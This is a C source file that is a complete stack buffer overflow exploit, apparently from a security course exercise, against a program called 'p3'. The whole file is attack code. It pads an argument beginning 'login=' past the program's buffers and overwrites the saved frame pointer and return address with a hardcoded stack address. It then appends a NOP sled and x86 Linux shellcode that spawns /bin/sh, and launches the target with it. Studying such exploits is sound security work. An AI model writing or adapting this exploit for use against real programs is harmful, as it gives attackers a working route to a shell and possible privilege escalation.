#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"
static char shellcode[] = ""
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

// called by frame at 0xbffff430
static char return_address []=  "\x34\xf4\xff\xbf";

static const size_t BUFFSIZE = 1024;

int main(){
    char *buffer = malloc(BUFFSIZE);
    char *args[] = {"p3", buffer};
    int i;

    // has to start with login=
    strncat(args[1], "l", 1);
    strncat(args[1], "o", 1);
    strncat(args[1], "g", 1);
    strncat(args[1], "i", 1);
    strncat(args[1], "n", 1);
    strncat(args[1], "=", 1);

    // overwrite rest of str2
    for(i = 0; i < 512 - 6; i++) {
        strncat(args[1], "\xff", 1);
    }

    // overwrite of str1
    for(i = 0; i < 256; i++) {
        strncat(args[1], "\xff", 1);
    }

    // overwrite i
    for(i = 0; i < 4; i++) {
        strncat(args[1], "\xff", 1);
    }

    // Overwrite frame pointer
    strncat(args[1], "\xFF", 1);
    strncat(args[1], "\xFF", 1);
    strncat(args[1], "\xFF", 1);
    strncat(args[1], "\xFF", 1);

    strncat(args[1], return_address, 4); 

    for(i = 0; i <= BUFFSIZE - strlen(shellcode)-1; i++){
        strncat(args[1], "\x90", 1);
    }
    strncat(args[1], shellcode, strlen(shellcode));

    execl(args[0],args[0], args[1], NULL);
    return 0;
}
